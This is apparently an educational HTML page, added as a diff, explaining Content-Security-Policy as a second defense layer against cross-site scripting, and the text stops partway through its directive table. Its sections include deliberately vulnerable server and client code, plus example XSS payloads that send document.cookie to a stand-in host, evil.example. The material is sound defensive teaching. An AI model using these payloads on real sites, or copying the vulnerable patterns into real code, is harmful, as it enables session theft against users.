@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Content-Security-Policy — Defense in Depth After Sanitization Fails</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#0b0f1a; --bg2:#111827; --bg3:#1a2235; --card:#141c2e;
+  --border:#1e3a5f; --gold:#f5c842; --gold2:#c9a227;
+  --cyan:#38bdf8; --teal:#0d9488; --red:#f87171;
+  --green:#4ade80; --purple:#a78bfa; --orange:#fb923c;
+  --text:#e2e8f0; --muted:#7a9bbf; --code-bg:#060d1a;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.8;}
+
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;position:relative;overflow:hidden;padding:3rem 2rem;}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:60px 60px;opacity:.4;animation:gridPulse 8s ease-in-out infinite alternate;}
+@keyframes gridPulse{from{opacity:.25}to{opacity:.5}}
+.hero-glow{position:absolute;width:700px;height:700px;border-radius:50%;background:radial-gradient(circle,rgba(167,139,250,.14) 0%,transparent 70%);top:50%;left:50%;transform:translate(-50%,-50%);animation:glow 6s ease-in-out infinite alternate;}
+@keyframes glow{from{transform:translate(-50%,-50%) scale(1)}to{transform:translate(-50%,-50%) scale(1.15)}}
+.hero-content{position:relative;z-index:2;max-width:950px}
+.hero-tag{display:inline-block;background:rgba(167,139,250,.12);border:1px solid rgba(167,139,250,.3);color:var(--purple);font-size:.75rem;letter-spacing:.2em;text-transform:uppercase;padding:.4rem 1.2rem;border-radius:2rem;margin-bottom:2rem;}
+.hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.6rem,6vw,5rem);font-weight:900;line-height:1.1;color:#fff;margin-bottom:1.5rem;}
+.hero h1 span{color:var(--purple)}
+.hero-sub{font-size:1.1rem;color:var(--muted);max-width:720px;margin:0 auto 2.5rem;}
+.hero-stats{display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;margin-top:1rem;}
+.hero-stat .num{font-family:'Source Code Pro',monospace;font-size:2rem;font-weight:700;color:var(--purple);}
+.hero-stat .lbl{font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);}
+.hero-scroll{display:flex;align-items:center;gap:.6rem;color:var(--muted);font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;margin-top:3rem;}
+.scroll-line{width:40px;height:1px;background:var(--muted)}
+
+.toc{position:fixed;right:1.5rem;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:.5rem;z-index:100;}
+.toc-dot{width:8px;height:8px;border-radius:50%;background:var(--border);border:none;cursor:pointer;transition:all .3s;text-decoration:none;display:block;}
+.toc-dot:hover,.toc-dot.active{background:var(--purple);transform:scale(1.4);}
+@media(max-width:900px){.toc{display:none}}
+
+.container{max-width:1020px;margin:0 auto;padding:0 2rem}
+section{padding:5rem 0}
+section:nth-child(even){background:var(--bg2)}
+.section-num{font-family:'Source Code Pro',monospace;font-size:.8rem;color:var(--teal);letter-spacing:.2em;text-transform:uppercase;margin-bottom:.5rem;}
+h2{font-family:'Playfair Display',serif;font-size:clamp(1.8rem,4vw,2.6rem);color:#fff;margin-bottom:1.2rem;line-height:1.2;}
+h2 .accent{color:var(--cyan)}
+h2 .accent.p{color:var(--purple)}
+h2 .accent.r{color:var(--red)}
+h3{font-family:'Playfair Display',serif;font-size:1.3rem;color:var(--purple);margin:2rem 0 .8rem;}
+p{margin-bottom:1.2rem;color:var(--text)}
+strong{color:var(--gold);font-weight:700}
+em{color:var(--cyan);font-style:normal}
+ul,ol{padding-left:1.5rem;margin-bottom:1.2rem;}
+li{margin-bottom:.4rem;color:var(--text);}
+
+.reveal{opacity:0;transform:translateY(28px);transition:opacity .55s ease,transform .55s ease;}
+.reveal.visible{opacity:1;transform:none}
+
+.callout{border-left:4px solid var(--gold);background:rgba(245,200,66,.06);padding:1.2rem 1.5rem;border-radius:0 8px 8px 0;margin:1.8rem 0;}
+.callout.cyan{border-color:var(--cyan);background:rgba(56,189,248,.06)}
+.callout.green{border-color:var(--green);background:rgba(74,222,128,.06)}
+.callout.red{border-color:var(--red);background:rgba(248,113,113,.06)}
+.callout.purple{border-color:var(--purple);background:rgba(167,139,250,.06)}
+.callout.orange{border-color:var(--orange);background:rgba(251,146,60,.06)}
+.callout-title{font-family:'Source Code Pro',monospace;font-size:.75rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.6rem}
+.callout.gold .callout-title,.callout-title.gold{color:var(--gold)}
+.callout.cyan .callout-title{color:var(--cyan)}
+.callout.green .callout-title{color:var(--green)}
+.callout.red .callout-title{color:var(--red)}
+.callout.purple .callout-title{color:var(--purple)}
+.callout.orange .callout-title{color:var(--orange)}
+
+.formula{background:var(--code-bg);border:1.5px solid var(--gold2);border-radius:10px;padding:1.4rem 2rem;text-align:center;margin:1.8rem 0;font-family:'Source Code Pro',monospace;font-size:1.1rem;color:var(--gold);letter-spacing:.04em;}
+.formula .label{display:block;font-size:.7rem;letter-spacing:.2em;text-transform:uppercase;color:var(--muted);margin-bottom:.6rem;font-family:'Lato',sans-serif;}
+.formula .sub{display:block;font-size:.82rem;color:var(--muted);margin-top:.6rem;font-family:'Lato',sans-serif;letter-spacing:0;}
+.formula.cyan{border-color:var(--cyan);color:var(--cyan)}
+.formula.purple{border-color:var(--purple);color:var(--purple)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;padding:1.8rem;overflow-x:auto;margin:1.5rem 0;position:relative;}
+pre .tag{position:absolute;top:.6rem;right:1rem;font-family:'Source Code Pro',monospace;font-size:.65rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);background:var(--bg3);padding:.2rem .6rem;border-radius:4px;}
+code{font-family:'Source Code Pro',monospace;font-size:.87rem;line-height:1.9;}
+.kw{color:#c792ea}.fn{color:#82aaff}.str{color:#c3e88d}.num{color:#f78c6c}.cm{color:#546e7a;font-style:italic}.cls{color:#ffcb6b}.var{color:var(--cyan)}.dir{color:var(--purple);font-weight:600}
+
+.data-table-wrap{overflow-x:auto;margin:1.8rem 0}
+table{border-collapse:collapse;width:100%;font-family:'Source Code Pro',monospace;font-size:.87rem;}
+th{background:var(--bg3);color:var(--gold);padding:.7rem 1.1rem;border:1px solid var(--border);text-align:left;letter-spacing:.06em;font-weight:600;}
+td{padding:.55rem 1.1rem;border:1px solid var(--border);color:var(--text);background:var(--card);}
+tr:hover td{background:var(--bg3)}
+td.hl{color:var(--cyan);font-weight:600} td.pos{color:var(--green)} td.neg{color:var(--red)} td.gold{color:var(--gold)}
+td.center{text-align:center}
+
+.step-list{list-style:none;padding:0;counter-reset:steps;margin:1.8rem 0;}
+.step-list li{counter-increment:steps;display:flex;gap:1.2rem;margin-bottom:1.8rem;align-items:flex-start;}
+.step-list li::before{content:counter(steps);flex-shrink:0;width:36px;height:36px;border-radius:50%;background:rgba(167,139,250,.15);border:1.5px solid var(--purple);color:var(--purple);font-family:'Source Code Pro',monospace;font-size:.85rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
+.step-body strong{display:block;color:#fff;margin-bottom:.3rem;}
+
+.canvas-wrap{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:1.8rem 0;}
+.canvas-label{font-family:'Source Code Pro',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+canvas{display:block;width:100%;}
+
+.controls{display:flex;gap:1rem;flex-wrap:wrap;margin:1rem 0;align-items:center;}
+.ctrl-btn{background:rgba(56,189,248,.1);border:1.5px solid var(--cyan);color:var(--cyan);padding:.45rem 1.2rem;border-radius:6px;cursor:pointer;font-family:'Source Code Pro',monospace;font-size:.8rem;letter-spacing:.1em;text-transform:uppercase;transition:all .2s;}
+.ctrl-btn:hover{background:rgba(56,189,248,.22);}
+.ctrl-btn.gold{border-color:var(--gold);color:var(--gold);background:rgba(245,200,66,.08);}
+.ctrl-btn.gold:hover{background:rgba(245,200,66,.18);}
+.ctrl-btn.red{border-color:var(--red);color:var(--red);background:rgba(248,113,113,.08);}
+.ctrl-btn.red:hover{background:rgba(248,113,113,.18);}
+.ctrl-btn.purple{border-color:var(--purple);color:var(--purple);background:rgba(167,139,250,.08);}
+.ctrl-btn.purple:hover{background:rgba(167,139,250,.18);}
+.ctrl-btn.green{border-color:var(--green);color:var(--green);background:rgba(74,222,128,.08);}
+.ctrl-btn.green:hover{background:rgba(74,222,128,.18);}
+
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin:1.8rem 0;}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.1rem;text-align:center;}
+.stat-card .val{font-family:'Source Code Pro',monospace;font-size:1.7rem;font-weight:700;color:var(--purple);margin-bottom:.3rem;}
+.stat-card .lbl{font-size:.75rem;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;}
+
+.family-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1rem;margin:1.8rem 0;}
+.family-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.2rem;}
+.family-card .fam-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:.7rem;}
+.family-card .fam-name{font-family:'Source Code Pro',monospace;font-size:.78rem;letter-spacing:.12em;text-transform:uppercase;font-weight:600;}
+.family-card .fam-count{font-family:'Source Code Pro',monospace;font-size:.75rem;background:rgba(56,189,248,.1);border:1px solid rgba(56,189,248,.25);color:var(--cyan);padding:.15rem .55rem;border-radius:3px;}
+.family-card .fam-desc{font-size:.88rem;color:var(--muted);line-height:1.5;margin-bottom:.8rem;}
+.feat-list{display:flex;flex-wrap:wrap;gap:.4rem;}
+.feat-pill{font-family:'Source Code Pro',monospace;font-size:.72rem;padding:.2rem .55rem;border-radius:3px;white-space:nowrap;}
+
+.compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin:1.8rem 0;}
+@media(max-width:640px){.compare-grid{grid-template-columns:1fr}}
+.compare-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.3rem;}
+.compare-card h4{font-family:'Source Code Pro',monospace;font-size:.75rem;letter-spacing:.14em;text-transform:uppercase;margin-bottom:.8rem;}
+.compare-card.good h4{color:var(--green)} .compare-card.bad h4{color:var(--red)}
+
+.pipeline{display:flex;align-items:stretch;gap:.6rem;margin:1.8rem 0;overflow-x:auto;padding-bottom:.5rem;}
+.pipe-stage{flex:1;min-width:130px;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem .9rem;text-align:center;position:relative;}
+.pipe-stage .pipe-icon{font-size:1.5rem;margin-bottom:.4rem;}
+.pipe-stage .pipe-name{font-family:'Source Code Pro',monospace;font-size:.78rem;color:var(--purple);letter-spacing:.05em;margin-bottom:.3rem;}
+.pipe-stage .pipe-desc{font-size:.76rem;color:var(--muted);line-height:1.4;}
+.pipe-arrow{display:flex;align-items:center;color:var(--muted);font-size:1.2rem;flex-shrink:0;}
+@media(max-width:760px){.pipeline{flex-direction:column}.pipe-arrow{transform:rotate(90deg);justify-content:center;padding:.2rem 0;}}
+
+.glossary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.1rem;margin-top:1.5rem;}
+.glossary-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.1rem 1.3rem;}
+.glossary-term{font-family:'Source Code Pro',monospace;font-size:.8rem;color:var(--gold);letter-spacing:.07em;margin-bottom:.35rem;text-transform:uppercase;}
+.glossary-def{font-size:.9rem;color:var(--muted);line-height:1.6;}
+
+.sidenote{background:var(--card);border:1px dashed var(--muted);border-radius:10px;padding:1.1rem 1.4rem;margin:1.8rem 0;font-size:.92rem;color:var(--muted);}
+.sidenote b{color:var(--gold)}
+
+footer{padding:3rem 2rem;text-align:center;border-top:1px solid var(--border);color:var(--muted);font-size:.85rem;}
+footer a{color:var(--cyan);text-decoration:none;}
+</style>
+</head>
+<body>
+
+<nav class="toc">
+  <a class="toc-dot" href="#hero" title="Intro"></a>
+  <a class="toc-dot" href="#xss" title="The XSS Problem"></a>
+  <a class="toc-dot" href="#sanitization" title="Sanitization Is Fragile"></a>
+  <a class="toc-dot" href="#secondlayer" title="CSP as Second Layer"></a>
+  <a class="toc-dot" href="#anatomy" title="Anatomy of a Header"></a>
+  <a class="toc-dot" href="#directives" title="Directive Reference"></a>
+  <a class="toc-dot" href="#enforcement" title="How Enforcement Works"></a>
+  <a class="toc-dot" href="#limits" title="What CSP Doesn't Do"></a>
+  <a class="toc-dot" href="#practice" title="Why It Matters"></a>
+  <a class="toc-dot" href="#glossary" title="Glossary"></a>
+</nav>
+
+<!-- HERO -->
+<section class="hero" id="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="hero-content">
+    <div class="hero-tag">Web Security · Application Layer · Browser-Enforced Policy</div>
+    <h1>Content-Security-Policy:<br><span>Defense in Depth After Sanitization Fails</span></h1>
+    <p class="hero-sub">Every serious web application tries to sanitize every byte of untrusted input before it ever touches the page. And in a codebase with hundreds of templates, dozens of contributors, and years of history, that plan <em>will</em> eventually fail somewhere — one unescaped field, one <code>innerHTML</code> assignment, one third-party widget with a bug of its own. Content-Security-Policy is the browser-enforced backstop that assumes exactly that: it doesn't try to stop an attacker's <code>&lt;script&gt;</code> tag from landing in your HTML. It tries to make sure that even if it lands, it never runs.</p>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="num">1</div><div class="lbl">HTTP Response Header</div></div>
+      <div class="hero-stat"><div class="num">N</div><div class="lbl">Allowed Source Origins</div></div>
+      <div class="hero-stat"><div class="num">0</div><div class="lbl">Trust In Injected Scripts</div></div>
+      <div class="hero-stat"><div class="num">2nd</div><div class="lbl">Layer, Not the First</div></div>
+    </div>
+    <div class="hero-scroll"><div class="scroll-line"></div>Scroll to explore<div class="scroll-line"></div></div>
+  </div>
+</section>
+
+<!-- SECTION 1: THE XSS PROBLEM -->
+<section id="xss">
+<div class="container">
+  <div class="section-num">01 — The Threat Model</div>
+  <h2>What <span class="accent p">Cross-Site Scripting</span> Actually Is</h2>
+
+  <p class="reveal">Cross-Site Scripting — everyone just says <strong>XSS</strong> — is the umbrella name for a single, very concrete failure: <strong>an attacker manages to get their own JavaScript to run on a page it shouldn't</strong>. Not on their own site, where they can already run whatever code they want. On <em>your</em> site, in <em>your</em> visitor's browser, with the same trust, cookies, and DOM access any of your own legitimate scripts would have.</p>
+
+  <p class="reveal">The most common way this happens is depressingly simple: a page takes some piece of user-controlled input — a search query, a comment, a username, a URL parameter — and writes it into the page's HTML without properly neutralizing it first. If that input happens to contain something that looks like a <code>&lt;script&gt;</code> tag, and nothing along the way strips or escapes it, the browser's HTML parser can't tell the difference between "content the site author wrote" and "content an attacker snuck in." It just parses tags. All of them.</p>
+
+  <pre class="reveal"><span class="tag">vulnerable server code</span><code><span class="cm">// server route: GET /search?q=...</span>
+<span class="kw">app</span>.<span class="fn">get</span>(<span class="str">'/search'</span>, (req, res) => {
+  <span class="kw">const</span> query = req.query.q;
+  <span class="cm">// DANGER: query is written directly into the response HTML,</span>
+  <span class="cm">// with no escaping of &lt;, &gt;, ", or ' characters.</span>
+  res.<span class="fn">send</span>(<span class="str">`&lt;h1&gt;Results for: ${query}&lt;/h1&gt;`</span>);
+});
+
+<span class="cm">// attacker sends this as the "q" parameter:</span>
+<span class="cm">// ?q=&lt;script&gt;fetch('https://evil.example/steal?c='+document.cookie)&lt;/script&gt;</span>
+
+<span class="cm">// the server happily reflects it back into the response HTML.</span>
+<span class="cm">// the victim's browser parses that HTML and executes the script —</span>
+<span class="cm">// because as far as the parser is concerned, it's just another tag</span>
+<span class="cm">// the server sent it.</span></code></pre>
+
+  <p class="reveal">That single reflected payload is enough to read the victim's session cookie, act as them against your API, capture keystrokes, redraw the page into a fake login form, or pivot into whatever else the page's JavaScript is trusted to do. The attacker never touched your server. They just handed a normal-looking link to a normal-looking user, and let the victim's own trusted browser session do the damage.</p>
+
+  <div class="family-grid reveal">
+    <div class="family-card">
+      <div class="fam-header"><span class="fam-name" style="color:var(--red)">Reflected XSS</span><span class="fam-count">via request</span></div>
+      <div class="fam-desc">The payload rides in on the request itself — a query string, a form field — and the server immediately echoes it back into the response, unescaped. Requires tricking a victim into clicking a crafted link.</div>
+      <div class="feat-list"><span class="feat-pill" style="background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.25)">URL params</span><span class="feat-pill" style="background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.25)">search boxes</span></div>
+    </div>
+    <div class="family-card">
+      <div class="fam-header"><span class="fam-name" style="color:var(--orange)">Stored XSS</span><span class="fam-count">via database</span></div>
+      <div class="fam-desc">The payload gets saved server-side — a comment, a profile bio, a support ticket — and re-rendered, unescaped, every single time <em>any</em> visitor loads that page. No crafted link needed; the page itself is now the weapon.</div>
+      <div class="feat-list"><span class="feat-pill" style="background:rgba(251,146,60,.1);color:var(--orange);border:1px solid rgba(251,146,60,.25)">comments</span><span class="feat-pill" style="background:rgba(251,146,60,.1);color:var(--orange);border:1px solid rgba(251,146,60,.25)">profile fields</span></div>
+    </div>
+    <div class="family-card">
+      <div class="fam-header"><span class="fam-name" style="color:var(--purple)">DOM-based XSS</span><span class="fam-count">via client JS</span></div>
+      <div class="fam-desc">The server never sees the tainted value at all — the page's own JavaScript reads something attacker-controlled (like <code>location.hash</code>) and writes it into the DOM via <code>innerHTML</code> or similar, entirely client-side.</div>
+      <div class="feat-list"><span class="feat-pill" style="background:rgba(167,139,250,.1);color:var(--purple);border:1px solid rgba(167,139,250,.25)">innerHTML</span><span class="feat-pill" style="background:rgba(167,139,250,.1);color:var(--purple);border:1px solid rgba(167,139,250,.25)">location.hash</span></div>
+    </div>
+  </div>
+
+  <div class="callout red reveal">
+    <div class="callout-title">⚠️ Why "Just Run In The Page" Is So Devastating</div>
+    An XSS payload doesn't need to be clever to be catastrophic — it just needs to <em>execute</em>. Once it does, it is indistinguishable from your own site's legitimate JavaScript: same origin, same cookies (unless <code>HttpOnly</code> is set), same DOM, same ability to make authenticated requests to your own API. There's no sandbox between "your code" and "code that happened to arrive via a form field" once the browser has parsed and executed both as the same page.
+  </div>
+
+  <p class="reveal">The DOM-based variant is worth its own concrete example, because it doesn't require a single unescaped byte on the server at all — the whole bug lives in client-side JavaScript that trusts the wrong thing:</p>
+
+  <pre class="reveal"><span class="tag">vulnerable client-side code</span><code><span class="cm">// A "welcome back" banner that reads a name from the URL fragment</span>
+<span class="kw">const</span> name = <span class="cls">location</span>.hash.<span class="fn">slice</span>(<span class="num">1</span>); <span class="cm">// e.g. #Bob</span>
+<span class="var">document</span>.<span class="fn">getElementById</span>(<span class="str">'welcome'</span>).innerHTML =
+  <span class="str">`Welcome back, ${name}!`</span>;
+
+<span class="cm">// attacker sends a link with a crafted fragment instead of a name:</span>
+<span class="cm">// https://victim.example/#&lt;img src=x onerror=fetch('https://evil.example?c='+document.cookie)&gt;</span>
+
+<span class="cm">// location.hash is never sent to the server — the server-side code</span>
+<span class="cm">// could be perfectly sanitized and this bug would still exist,</span>
+<span class="cm">// because the vulnerable line is entirely client-side.</span></code></pre>
+</div>
+</section>
+
+<!-- SECTION 2: SANITIZATION IS FRAGILE -->
+<section id="sanitization">
+<div class="container">
+  <div class="section-num">02 — Why the First Line Isn't Enough Alone</div>
+  <h2>Why Perfect <span class="accent p">Sanitization</span> Is Fragile</h2>
+
+  <p class="reveal">The standard advice for preventing XSS is correct as far as it goes: <strong>escape or encode every piece of untrusted data for the exact context it's being written into</strong>. That sounds like one rule. In practice it's several different rules, because "context" isn't one thing:</p>
+
+  <ul class="reveal">
+    <li><strong>HTML body context</strong> — encode <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> so text can't open new tags.</li>
+    <li><strong>HTML attribute context</strong> — also encode quote characters, or an attacker can close the attribute early and inject a new one (like <code>onerror=</code>).</li>
+    <li><strong>JavaScript string context</strong> — HTML-encoding isn't enough; you need JS string escaping, or a value dropped into <code>&lt;script&gt;var x = "USER_INPUT"&lt;/script&gt;</code> can break out of the string entirely.</li>
+    <li><strong>URL context</strong> — a <code>javascript:</code> URL in an <code>href</code> executes as code when clicked, no <code>&lt;script&gt;</code> tag required at all.</li>
+    <li><strong>CSS context</strong> — certain CSS constructs can exfiltrate data or, in older browsers, execute expressions.</li>
+  </ul>
+
+  <p class="reveal">A framework with good auto-escaping (React, Vue, most modern template engines) handles the common cases correctly by default. But every one of them ships an escape hatch for when a developer <em>really does</em> need to render raw HTML — <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, a <code>|safe</code> template filter, a plain <code>.innerHTML =</code> assignment. Those exist for legitimate reasons. They are also exactly where XSS bugs concentrate, because the framework's safety net explicitly does not apply there.</p>
+
+  <div class="sidenote reveal">
+    <b>The false confidence trap.</b> Auto-escaping frameworks are genuinely great at preventing the <em>common</em> XSS bug. The danger is that they train developers to stop thinking about escaping entirely — so the one place someone reaches for an escape hatch (often under deadline pressure, often copy-pasted from a Stack Overflow answer, often touching a third-party widget's config) becomes the one place nobody double-checks.
+  </div>
+
+  <p class="reveal">Now scale that up to a real application: hundreds of templates, dozens of contributors over several years, a handful of third-party libraries each with their own DOM-manipulation code, an admin panel someone wrote in a hurry, an old endpoint nobody's touched since 2019. <strong>Sanitization has to be perfect everywhere, forever, across every context, to work at all.</strong> An attacker only needs to find the one place it wasn't.</p>
+
+  <div class="callout gold reveal">
+    <div class="callout-title">💡 The Asymmetry That Makes This Hard</div>
+    This is the core problem with relying on input sanitization as your <em>only</em> defense: the defender has to get every single injection point right, in every context, forever — including code that hasn't been written yet. The attacker just has to find one gap, one time. That is not a fair fight, and it's exactly the kind of asymmetry that justifies adding a second, independent layer that doesn't depend on any individual line of sanitization code being correct.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 3: CSP AS SECOND LAYER -->
+<section id="secondlayer">
+<div class="container">
+  <div class="section-num">03 — The Second Layer</div>
+  <h2>CSP: A Second, <span class="accent p">Independent</span> Layer</h2>
+
+  <p class="reveal">Content-Security-Policy takes a completely different angle on the same problem. Instead of trying to stop an attacker's <code>&lt;script&gt;</code> tag from ever reaching the page's HTML, it accepts that it might get there anyway — and asks a different question entirely: <strong>when the browser is about to execute a script (or load a stylesheet, or fetch an image, or open a frame), is this a source of content the page's own owner actually authorized?</strong></p>
+
+  <p class="reveal">CSP is delivered as a single HTTP response header, sent by your server alongside the page:</p>
+
+  <div class="formula purple reveal">
+    <span class="label">A response header, read by the browser</span>
+    Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
+    <span class="sub">Translation: "Only execute scripts that came from this exact origin, or from cdn.jsdelivr.net. Nothing else — no matter how it got into the page."</span>
+  </div>
+
+  <p class="reveal">That last clause is the whole point. The browser doesn't ask <em>how</em> a <code>&lt;script&gt;</code> tag ended up in the page's DOM — whether the site's own developer wrote it, or an attacker's payload slipped past a broken sanitizer. It only asks <em>where the script's content came from</em>, and checks that against the allowlist in the policy. An attacker's injected <code>&lt;script&gt;fetch('https://evil.example/steal?c='+document.cookie)&lt;/script&gt;</code> is <strong>inline</strong> content with no matching source — and a properly configured CSP simply refuses to run it. Not because the injection was blocked. Because the browser itself declined to execute what got through.</p>
+
+  <div class="canvas-wrap reveal">
+    <div class="canvas-label" id="cspLabel">▶ Watch the browser's gatekeeper decide — click a button to run</div>
+    <canvas id="cspCanvas" height="320"></canvas>
+  </div>
+  <div class="controls reveal">
+    <button class="ctrl-btn red" onclick="runCSP('evil')">▶ Inject &lt;script src="evil.example"&gt;</button>
+    <button class="ctrl-btn green" onclick="runCSP('legit')">▶ Load &lt;script src="/app.js"&gt;</button>
+    <button class="ctrl-btn" onclick="resetCSP()">Reset</button>
+  </div>
+
+  <div class="callout purple reveal">
+    <div class="callout-title">🔑 The Key Property: Independence</div>
+    CSP enforcement doesn't know or care whether your sanitization was perfect, sloppy, or nonexistent for this particular field. It re-checks <em>every</em> script the page tries to execute, from every possible entry point, against the same allowlist, every single time. A bug in one template doesn't weaken CSP's protection anywhere else — that's what makes it a genuinely <em>independent</em> layer, not just a second copy of the same trust assumption.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 4: ANATOMY OF A HEADER -->
+<section id="anatomy">
+<div class="container">
+  <div class="section-num">04 — Reading The Real Thing</div>
+  <h2>Anatomy of a Real <span class="accent p">CSP Header</span></h2>
+
+  <p class="reveal">Here's a realistic, production-shaped CSP header — the kind you'd actually see on a well-configured site. It's one line; we've broken it up so each directive is easy to point at.</p>
+
+  <pre class="reveal"><span class="tag">http response header</span><code><span class="dir">Content-Security-Policy:</span>
+  <span class="dir">default-src</span> <span class="str">'self'</span>;
+  <span class="dir">script-src</span> <span class="str">'self'</span> <span class="str">https://cdn.jsdelivr.net</span>;
+  <span class="dir">style-src</span> <span class="str">'self'</span> <span class="str">'unsafe-inline'</span>;
+  <span class="dir">img-src</span> <span class="str">'self'</span> <span class="str">data:</span> <span class="str">https:</span>;
+  <span class="dir">connect-src</span> <span class="str">'self'</span> <span class="str">https://api.example.com</span>;
+  <span class="dir">frame-ancestors</span> <span class="str">'none'</span>;
+  <span class="dir">object-src</span> <span class="str">'none'</span>;
+  <span class="dir">base-uri</span> <span class="str">'self'</span>;
+  <span class="dir">form-action</span> <span class="str">'self'</span></code></pre>
+
+  <p class="reveal">Every directive follows the same shape: <code class="dir">directive-name</code> followed by a space-separated list of allowed sources. Semicolons separate directives. The browser parses this once, per response, and holds onto it for the lifetime of that document.</p>
+
+  <ol class="step-list reveal">
+    <li><div class="step-body"><strong><code class="dir">default-src 'self'</code> — the fallback for everything</strong>Any directive you don't specify explicitly (like <code>font-src</code> or <code>media-src</code> in this example) falls back to whatever <code>default-src</code> says. Here, that means "same-origin only" for anything not called out below.</div></li>
+    <li><div class="step-body"><strong><code class="dir">script-src 'self' https://cdn.jsdelivr.net</code> — the important one</strong>Scripts may load from this exact origin, or from that one CDN. Nowhere else. No inline <code>&lt;script&gt;</code> tags, no <code>javascript:</code> URLs, no <code>eval()</code> — because none of that was explicitly allowed with keywords like <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code>.</div></li>
+    <li><div class="step-body"><strong><code class="dir">style-src 'self' 'unsafe-inline'</code> — a deliberate, narrower trade-off</strong>Styles are allowed from same-origin, plus inline <code>style="..."</code> attributes and <code>&lt;style&gt;</code> blocks. CSS injection is lower-severity than script injection, so some teams accept this trade-off for style-src specifically — while never doing it for script-src.</div></li>
+    <li><div class="step-body"><strong><code class="dir">img-src 'self' data: https:</code> — deliberately looser</strong>Images can come from same-origin, inline <code>data:</code> URIs, or any HTTPS host. Images can't execute code, so a broad allowlist here is a reasonable risk for most sites (though it can still be abused for tracking pixels).</div></li>
+    <li><div class="step-body"><strong><code class="dir">connect-src 'self' https://api.example.com</code> — where fetch()/XHR/WebSocket may talk</strong>Even if a script is allowed to run, this caps where it's allowed to <em>send data to</em> — closing off a common exfiltration path for any script that does manage to execute.</div></li>
+    <li><div class="step-body"><strong><code class="dir">frame-ancestors 'none'</code> — clickjacking defense</strong>No other page, anywhere, may embed this page in an <code>&lt;iframe&gt;</code>. This is CSP's modern replacement for the old <code>X-Frame-Options</code> header.</div></li>
+    <li><div class="step-body"><strong><code class="dir">object-src 'none'</code> — kill legacy plugin content</strong>Blocks <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, and <code>&lt;applet&gt;</code> entirely — old plugin-based content types with their own long history of security bugs.</div></li>
+    <li><div class="step-body"><strong><code class="dir">base-uri 'self'</code> — pin the document's base URL</strong>Without this, an attacker who can inject <em>any</em> HTML (even without CSP-blocked script) could add a <code>&lt;base&gt;</code> tag to silently redirect all of the page's relative URLs to their own domain.</div></li>
+    <li><div class="step-body"><strong><code class="dir">form-action 'self'</code> — pin where forms may submit</strong>Even a form injected via HTML (not script) can only submit back to the same origin — closing off a credential-harvesting trick that doesn't even require script execution.</div></li>
+  </ol>
+</div>
+</section>
+
+<!-- SECTION 5: DIRECTIVE REFERENCE TABLE -->
+<section id="directives">
+<div class="container">
+  <div class="section-num">05 — Quick Reference</div>
+  <h2>The Directive <span class="accent p">Reference Table</span></h2>
+
+  <p class="reveal">There are more directives than any one policy will ever use at once. Here's the reference table worth bookmarking.</p>
+
+  <div class="data-table-wrap reveal">
+    <table>
+      <thead><tr><th>Directive</th><th>Controls</th><th>Common Value</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td class="gold">default-src</td><td>Fallback for any unlisted fetch directive</td><td class="hl">'self'</td><td>Always set this — it's your safety net for directives you forget.</td></tr>
+        <tr><td class="gold">script-src</td><td>JavaScript execution sources</td><td class="hl">'self' https://cdn…</td><td>The single highest-impact directive for stopping XSS.</td></tr>
+        <tr><td class="gold">style-src</td><td>CSS sources</td><td class="hl">'self'</td><td>CSS injection can still exfiltrate data via attribute selectors.</td></tr>
+        <tr><td class="gold">img-src</td><td>Image sources</td><td class="hl">'self' data: https:</td><td>Images can't execute, so this is often the loosest directive.</td></tr>
